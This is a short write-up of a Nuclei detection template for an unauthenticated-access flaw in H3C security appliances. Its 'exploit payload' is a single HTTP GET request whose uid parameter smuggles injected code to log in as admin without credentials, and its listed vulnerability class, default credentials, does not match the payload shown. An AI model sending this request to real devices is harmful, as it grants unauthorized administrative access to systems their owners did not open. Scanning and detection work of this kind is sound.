# Nuclei Template: H3C Server - Unauthenticated Access
**Template ID:** unauthorized-h3csecparh-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`unauthorized-h3csecparh-login.yaml`)

## Vulnerability Information & PoC

## Description
H3C server was able to be accessed with no authentication requirements in place.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

